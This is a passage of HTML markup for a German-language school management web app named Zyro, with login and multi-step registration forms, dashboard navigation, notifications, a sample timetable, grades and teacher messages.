        </video>
        <div class="login-container">
            <div class="login-sidebar">
                <h1>Zyro</h1>
                <p>Das moderne Schulverwaltungssystem für Schüler, Lehrer und Eltern.</p>
                <div class="features">
                    <div class="feature">
                        <div class="feature-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                                <line x1="16" y1="2" x2="16" y2="6"></line>
                                <line x1="8" y1="2" x2="8" y2="6"></line>
                                <line x1="3" y1="10" x2="21" y2="10"></line>
                            </svg>
    </div>
                        <p>Intuitiver Stundenplan</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
                                <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
                            </svg>
                        </div>
                        <p>Übersichtliche Notenverwaltung</p>
                    </div>
                    <div class="feature">
                        <div class="feature-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                            </svg>
                        </div>
                        <p>Einfache Kommunikation</p>
                    </div>
                </div>
            </div>
            <div class="login-content">
                <div class="login-tabs">
                    <div class="login-tab active" id="login-tab" style="cursor: pointer;" onclick="document.getElementById('login-tab').classList.add('active'); document.getElementById('register-tab').classList.remove('active'); document.getElementById('login-form').style.display = 'block'; document.getElementById('register-form').style.display = 'none';">Anmeldung</div>
                    <div class="login-tab" id="register-tab" style="cursor: pointer;" onclick="document.getElementById('register-tab').classList.add('active'); document.getElementById('login-tab').classList.remove('active'); document.getElementById('register-form').style.display = 'block'; document.getElementById('login-form').style.display = 'none'; console.log('Registrierung geklickt');">Registrierung</div>
                </div>
                <form id="login-form" class="login-form active">
                    <div class="form-group">
                        <label for="username">Benutzername</label>
                        <input id="username" type="text" placeholder="Benutzername eingeben" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Passwort</label>
                        <input id="password" type="password" placeholder="Passwort eingeben" required>
                    </div>
                    <div class="form-footer">
                        <div class="remember-me">
                            <input id="remember-me" name="remember-me" type="checkbox" checked>
                            <label for="remember-me">Angemeldet bleiben</label>
                        </div>
                        <button type="button" onclick="document.getElementById('forgot-password-modal').style.display='flex'; document.getElementById('forgot-password-modal').classList.add('open'); document.getElementById('forgot-step-1').style.display='block'; document.getElementById('forgot-step-2').style.display='none'; document.getElementById('forgot-step-3').style.display='none';" style="background: none; border: none; color: var(--primary-600); text-decoration: underline; width: auto; box-shadow: none; font-size: 0.875rem; font-weight: 500; padding: 0; margin: 0; cursor: pointer;">Passwort vergessen?</button>
                    </div>
                    <button type="button" onclick="loginUser()">Anmelden</button>
                </form>
                
                <form id="register-form" class="login-form" style="display: none;">
                    <!-- Registrierungsschritte -->
                    <div class="register-steps">
                        <div class="register-step active" id="step-1">
                            <h3>Schritt 1: Persönliche Daten</h3>
                    <div class="form-group">
                        <label for="register-fullname">Vollständiger Name</label>
                        <input id="register-fullname" type="text" placeholder="Vor- und Nachname eingeben" required>
                    </div>
                    <div class="form-group">
                        <label for="register-role">Klasse oder Lehrer</label>
                        <div style="display: flex; gap: 1rem; align-items: center;">
                            <select id="register-class" required>
                                <option value="">Klasse wählen...</option>
                                <option value="5a">5a</option>
                                <option value="5b">5b</option>
                                <option value="6a">6a</option>
                                <option value="6b">6b</option>
                                <option value="7a">7a</option>
                                <option value="7b">7b</option>
                                <option value="8a">8a</option>
                                <option value="8b">8b</option>
                                <option value="9a">9a</option>
                                <option value="9b">9b</option>
                                <option value="10a">10a</option>
                                <option value="10b">10b</option>
                            </select>
                            <label style="display: flex; align-items: center; gap: 0.5rem;">
                                <input type="checkbox" id="register-teacher"> Lehrer
                            </label>
                        </div>
                    </div>
                            <div class="form-footer">
                                <button type="button" onclick="document.getElementById('step-1').style.display = 'none'; document.getElementById('step-2').style.display = 'block';">Weiter</button>
                            </div>
                        </div>
                        
                        <div class="register-step" id="step-2" style="display: none;">
                            <h3>Schritt 2: Kontaktdaten</h3>
                    <div class="form-group">
                        <label>Kontaktmöglichkeit</label>
                        <div class="contact-toggle">
                            <div class="contact-option active" id="email-option">E-Mail</div>
                            <div class="contact-option" id="phone-option">Telefonnummer</div>
                        </div>
                        <div id="email-input-container">
                            <input id="register-email" type="email" placeholder="E-Mail-Adresse eingeben" required>
                        </div>
                        <div id="phone-input-container" style="display: none;">
                            <input id="register-phone" type="tel" placeholder="Telefonnummer eingeben" pattern="[0-9]+" required>
                        </div>
                    </div>
                            <div class="form-footer">
                                <button type="button" onclick="document.getElementById('step-2').style.display = 'none'; document.getElementById('step-1').style.display = 'block';">Zurück</button>
                                <button type="button" onclick="document.getElementById('step-2').style.display = 'none'; document.getElementById('step-3').style.display = 'block';">Weiter</button>
                            </div>
                        </div>
                        
                        <div class="register-step" id="step-3" style="display: none;">
                            <h3>Schritt 3: Benutzername</h3>
                    <div class="form-group">
                        <label for="register-username">Benutzername</label>
                        <input id="register-username" type="text" placeholder="Benutzername eingeben" required>
                                <small>Benutzername darf keine Sonderzeichen enthalten und muss einzigartig sein.</small>
                    </div>
                    <div class="form-group">
                        <label for="register-school">Einrichtung / Schule</label>
                        <input id="register-school" type="text" value="Mathilde Anneken Schule" readonly style="background-color: #f3f4f6; cursor: not-allowed;">
                    </div>
                            <div class="form-footer">
                                <button type="button" onclick="document.getElementById('step-3').style.display = 'none'; document.getElementById('step-2').style.display = 'block';">Zurück</button>
                                <button type="button" onclick="document.getElementById('step-3').style.display = 'none'; document.getElementById('step-4').style.display = 'block';">Weiter</button>
                                </div>
                                </div>
                        
                        <div class="register-step" id="step-4" style="display: none;">
                            <h3>Schritt 4: Passwort</h3>
                    <div class="form-group">
                        <label for="register-password">Passwort</label>
                        <input id="register-password" type="password" placeholder="Passwort eingeben" required>
                    </div>
                    <div class="form-group">
                        <label for="register-confirm-password">Passwort bestätigen</label>
                        <input id="register-confirm-password" type="password" placeholder="Passwort wiederholen" required>
                    </div>
                    <div class="form-footer">
                                <button type="button" onclick="document.getElementById('step-4').style.display = 'none'; document.getElementById('step-3').style.display = 'block';">Zurück</button>
                                <button type="button" onclick="document.getElementById('step-4').style.display = 'none'; document.getElementById('step-5').style.display = 'block';">Weiter</button>
                            </div>
                        </div>
                        
                        <div class="register-step" id="step-5" style="display: none;">
                            <h3>Schritt 5: Bestätigung</h3>
                            <div class="form-group">
                                <p>Bitte überprüfe deine Angaben:</p>
                                <div id="summary-name"></div>
                                <div id="summary-contact"></div>
                                <div id="summary-username"></div>
                                <div id="summary-school"></div>
                                <div id="summary-class"></div>
                                <div id="summary-teacher"></div>
                            </div>
                            <div class="form-group">
                        <div class="remember-me">
                            <input id="register-terms" name="register-terms" type="checkbox" required>
                            <label for="register-terms">Ich akzeptiere die Nutzungsbedingungen</label>
                        </div>
                    </div>
                            <div class="form-footer">
                                <button type="button" onclick="document.getElementById('step-5').style.display = 'none'; document.getElementById('step-4').style.display = 'block';">Zurück</button>
                                <button type="button" onclick="registerUser()">Registrieren</button>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Dashboard -->
    <div class="dashboard" id="dashboard">
        <nav class="navigation" id="navigation">
            <div class="nav-header">
                <div class="nav-logo">Zyro</div>
            </div>
            <div class="nav-links" style="height: calc(100vh - 80px); overflow-y: auto; padding-bottom: 2rem;">
                <!-- Dashboard als erste Option -->
                <button type="button" class="nav-link active" onclick="showDashboardPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                            <polyline points="9 22 9 12 15 12 15 22"></polyline>
                        </svg>
                    </span>
                    Dashboard
                </button>

                <button type="button" class="nav-link" onclick="showStundenplanPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
                            <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
                        </svg>
                    </span>
                    Stundenplan
                </button>

                <button type="button" class="nav-link" onclick="showNotenPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
                            <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
                        </svg>
                    </span>
                    Noten
                </button>

                <button type="button" class="nav-link" onclick="document.getElementById('chat-system-modal').classList.add('open')" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                        </svg>
                    </span>
                    Chat
                </button>

                <button type="button" class="nav-link" onclick="showSubstitutionPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                            <line x1="16" y1="2" x2="16" y2="6"></line>
                            <line x1="8" y1="2" x2="8" y2="6"></line>
                            <line x1="3" y1="10" x2="21" y2="10"></line>
                        </svg>
                    </span>
                    Vertretungsplan
                </button>

                <button type="button" class="nav-link" onclick="showCalendarPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                            <line x1="16" y1="2" x2="16" y2="6"></line>
                            <line x1="8" y1="2" x2="8" y2="6"></line>
                            <line x1="3" y1="10" x2="21" y2="10"></line>
                        </svg>
                    </span>
                    Kalender/Termine
                </button>

                <button type="button" class="nav-link" onclick="showAbsencePage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                            <line x1="5" y1="12" x2="19" y2="12"></line>
                        </svg>
                    </span>
                    Krankmeldung
                </button>

                <button type="button" class="nav-link" onclick="showFeedbackPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                        </svg>
                    </span>
                    Feedback
                </button>

                <button type="button" class="nav-link" onclick="showNewsPage()" style="display: flex; align-items: center; width: 100%; text-align: left; background: none; border: none; padding: 0.75rem 1.5rem; color: var(--gray-600); text-decoration: none; transition: background-color 0.2s;">
                    <span class="nav-link-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path>
                        </svg>
                    </span>
                    Pinnwand/News
                </button>

                <!-- Bestehende Buttons beibehalten -->
                <!-- ... existing buttons ... -->
            </div>
        </nav>

        <div class="main-content">
            <header class="header">
                <button class="menu-button" id="menu-button">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="3" y1="12" x2="21" y2="12"></line>
                        <line x1="3" y1="6" x2="21" y2="6"></line>
                        <line x1="3" y1="18" x2="21" y2="18"></line>
                    </svg>
                </button>
                <h1 class="page-title" id="current-page-title">Dashboard</h1>
                <div class="header-actions">
                    <div style="position: relative;">
                    <button class="notification-button" id="notification-btn" onclick="event.stopPropagation(); document.getElementById('notifications-dropdown').classList.toggle('open'); document.getElementById('profile-dropdown').classList.remove('open');">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
                        </svg>
                    </button>
                    <div class="notifications-dropdown" id="notifications-dropdown">
                        <div class="notifications-header">
                            <div class="notifications-title">Benachrichtigungen</div>
                            <div class="mark-all-read" id="mark-all-read">Alle als gelesen markieren</div>
                        </div>
                        <div class="notifications-list">
                            <div class="notification-item notification-unread">
                                <div class="notification-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
                                        <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
                                    </svg>
                                </div>
                                <div class="notification-content">
                                    <div class="notification-title">Neue Noten</div>
                                    <div class="notification-message">In Mathematik wurden neue Noten eingetragen.</div>
                                    <div class="notification-time">Vor 10 Minuten</div>
                                </div>
                            </div>
                            <div class="notification-item notification-unread">
                                <div class="notification-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                                        <line x1="16" y1="2" x2="16" y2="6"></line>
                                        <line x1="8" y1="2" x2="8" y2="6"></line>
                                        <line x1="3" y1="10" x2="21" y2="10"></line>
                                    </svg>
                                </div>
                                <div class="notification-content">
                                    <div class="notification-title">Stundenplanänderung</div>
                                    <div class="notification-message">Der Unterricht am Freitag entfällt aufgrund einer Lehrerkonferenz.</div>
                                    <div class="notification-time">Vor 2 Stunden</div>
                                </div>
                            </div>
                            <div class="notification-item">
                                <div class="notification-icon">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                                    </svg>
                                </div>
                                <div class="notification-content">
                                    <div class="notification-title">Neue Nachricht</div>
                                    <div class="notification-message">Hr. Müller hat Ihnen eine Nachricht gesendet.</div>
                                    <div class="notification-time">Gestern, 15:30</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    </div>
                    <button class="notification-button" id="new-message-btn" onclick="event.stopPropagation(); document.getElementById('message-modal').classList.add('open');">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                            <line x1="12" y1="11" x2="12" y2="17"></line>
                            <line x1="9" y1="14" x2="15" y2="14"></line>
                        </svg>
                    </button>
                    <div class="profile-container">
                        <div class="profile-button" id="profile-button" onclick="event.stopPropagation(); document.getElementById('profile-dropdown').classList.toggle('open'); document.getElementById('notifications-dropdown').classList.remove('open');">
                            <div class="profile-image" id="profile-image">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                    <circle cx="12" cy="7" r="4"></circle>
                                </svg>
                            </div>
                        </div>
                        <div class="profile-dropdown" id="profile-dropdown">
                            <div class="profile-header">
                                <div class="profile-name" id="profile-name">Benutzername</div>
                                <div class="profile-email">schueler@schule.de</div>
                            </div>
                            <div class="profile-menu">
                                <div class="profile-menu-item" onclick="document.getElementById('profile-modal').classList.add('open');">
                                    <div class="profile-menu-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                                            <circle cx="12" cy="7" r="4"></circle>
                                        </svg>
                                    </div>
                                    <div class="profile-menu-text">Mein Profil</div>
                                </div>
                                <div class="profile-menu-item" onclick="document.getElementById('settings-modal').classList.add('open');">
                                    <div class="profile-menu-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                            <circle cx="12" cy="12" r="3"></circle>
                                            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
                                        </svg>
                                    </div>
                                    <div class="profile-menu-text">Einstellungen</div>
                                </div>
                                <div class="profile-menu-item" onclick="document.getElementById('notifications-modal').classList.add('open');">
                                    <div class="profile-menu-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
                                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
                                        </svg>
                                    </div>
                                    <div class="profile-menu-text">Benachrichtigungen</div>
                                </div>
                                <div class="profile-menu-item" onclick="document.getElementById('privacy-modal').classList.add('open');">
                                    <div class="profile-menu-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                                        </svg>
                                    </div>
                                    <div class="profile-menu-text">Datenschutz</div>
                                </div>
                                <div class="profile-menu-divider"></div>
                                <div class="profile-menu-item logout-item" style="cursor: pointer;" onclick="document.getElementById('dashboard').style.display = 'none'; document.getElementById('login-page').style.display = 'flex'; document.getElementById('profile-dropdown').classList.remove('open'); localStorage.removeItem('zyroLoggedIn'); localStorage.removeItem('zyroUser');">
                                    <div class="profile-menu-icon">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
                                            <polyline points="16 17 21 12 16 7"></polyline>
                                            <line x1="21" y1="12" x2="9" y2="12"></line>
                                        </svg>
                                    </div>
                                    <div class="profile-menu-text">Abmelden</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>

            <div class="content">
                <div class="page-container active" id="dashboard-content">
                    <div class="grid">
                    <!-- Stundenplan -->
                    <div class="card">
                        <div class="card-header">
                            <h2 class="card-title">Stundenplan</h2>
                                <a href="#" class="view-all" data-page="stundenplan">Alle anzeigen</a>
                        </div>
                        <div class="timetable">
                            <div class="timetable-day">
                                <div class="day-header">Montag</div>
                                <div class="lesson">
                                    <div class="lesson-time">08:00 - 09:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Mathematik</div>
                                        <div class="lesson-info">Raum 101 • Hr. Gökdemir / Fr. Jagusch</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">09:00 - 10:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Lernstudio</div>
                                        <div class="lesson-info">Raum 203 • Hr. Bierwirth / Fr. Heuer / Fr. Malz</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">10:00 - 10:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Pause</div>
                                        <div class="lesson-info">30 Minuten</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">10:30 - 11:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Projekt</div>
                                        <div class="lesson-info">Raum 105 • Hr. Weber</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">11:30 - 12:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Projekt</div>
                                        <div class="lesson-info">Raum 105 • Hr. Weber</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">12:30 - 13:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Pause</div>
                                        <div class="lesson-info">1 Stunde</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">13:30 - 14:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Kunst</div>
                                        <div class="lesson-info">Kunstraum • Fr. Schaich</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">14:30 - 15:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Religion/PP</div>
                                        <div class="lesson-info">Raum 302 • Fr. Heuer</div>
                                    </div>
                                </div>
                            </div>
                            <div class="timetable-day">
                                <div class="day-header">Donnerstag</div>
                                <div class="lesson">
                                    <div class="lesson-time">08:00 - 09:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Epoche</div>
                                        <div class="lesson-info">Raum 205 • Hr. Schulz</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">09:00 - 10:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Lernstudio</div>
                                        <div class="lesson-info">Raum 203 • Fr. Schmidt</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">10:30 - 11:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Englisch</div>
                                        <div class="lesson-info">Raum 105 • Hr. Weber</div>
                                    </div>
                                </div>
                            </div>
                            <div class="timetable-day">
                                <div class="day-header">Freitag</div>
                                <div class="lesson">
                                    <div class="lesson-time">08:00 - 09:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Deutsch</div>
                                        <div class="lesson-info">Raum 203 • Fr. Schmidt</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">09:00 - 10:00</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">Hauswirtschaft/Technik</div>
                                        <div class="lesson-info">Fachraum • Hr. Hoffmann</div>
                                    </div>
                                </div>
                                <div class="lesson">
                                    <div class="lesson-time">10:30 - 11:30</div>
                                    <div class="lesson-content">
                                        <div class="lesson-subject">WPU 1</div>
                                        <div class="lesson-info">Verschiedene Räume</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Noten -->
                    <div class="card">
                        <div class="card-header">
                            <h2 class="card-title">Noten</h2>
                                <a href="#" class="view-all" data-page="noten">Alle anzeigen</a>
                        </div>
                        <div class="grades">
                            <div class="subject">
                                <div class="subject-name">Mathematik</div>
                                <div class="subject-grades">
                                    <span class="grade good">2</span>
                                    <span class="grade excellent">1</span>
                                    <span class="grade average">3</span>
                                </div>
                                <div class="subject-average">Durchschnitt: <strong>2,0</strong></div>
                            </div>
                            <div class="subject">
                                <div class="subject-name">Deutsch</div>
                                <div class="subject-grades">
                                    <span class="grade good">2</span>
                                    <span class="grade good">2</span>
                                </div>
                                <div class="subject-average">Durchschnitt: <strong>2,0</strong></div>
                            </div>
                            <div class="subject">
                                <div class="subject-name">Englisch</div>
                                <div class="subject-grades">
                                    <span class="grade excellent">1</span>
                                    <span class="grade good">2</span>
                                </div>
                                <div class="subject-average">Durchschnitt: <strong>1,5</strong></div>
                            </div>
                        </div>
                    </div>

                    <!-- Nachrichten -->
                    <div class="card col-span-full">
                        <div class="card-header">
                            <h2 class="card-title">Nachrichten</h2>
                                <a href="#" class="view-all" data-page="nachrichten">Alle anzeigen</a>
                        </div>
                        <div class="messages">
                            <div class="message">
                                <div class="message-sender">Hr. Gökdemir</div>
                                <div class="message-subject">Hausaufgaben für Montag</div>
                                <div class="message-preview">Bitte bearbeiten Sie die Aufgaben auf Seite 42-43...</div>
                                <div class="message-time">Heute, 14:30</div>
                            </div>
                            <div class="message">
                                <div class="message-sender">Hr. Bierwirth</div>
                                <div class="message-subject">Klassenarbeit verschoben</div>
                                <div class="message-preview">Die für nächste Woche geplante Klassenarbeit wird auf...</div>
                                <div class="message-time">Gestern, 16:15</div>
                            </div>
                            <div class="message">
                                <div class="message-sender">Schulleitung</div>
                                <div class="message-subject">Elternabend</div>
                                <div class="message-preview">Am kommenden Donnerstag findet um 19:00 Uhr der Elternabend statt...</div>
                                <div class="message-time">15.05.2023, 09:00</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
                
                <!-- Stundenplan Seite -->
                <div class="page-container" id="stundenplan-page">
                    <div class="card">
                        <div class="card-header">
                            <h2 class="card-title">Stundenplan</h2>
                        </div>
                        <div class="full-timetable">
                            <div class="time-column">
                                <div class="time-header">Montag</div>
                                <div class="time-slot">
                                    <div class="time-slot-time">08:00 - 09:00</div>
                                    <div class="time-slot-subject">Mathematik</div>
                                    <div class="time-slot-info">Raum 101 • Hr. Müller</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">09:00 - 10:00</div>
                                    <div class="time-slot-subject">Lernstudio</div>
                                    <div class="time-slot-info">Raum 203 • Fr. Schmidt</div>
                                </div>
                                <div class="time-slot">
                                    <div class="time-slot-time">10:00 - 10:30</div>
                                    <div class="time-slot-subject">Pause</div>
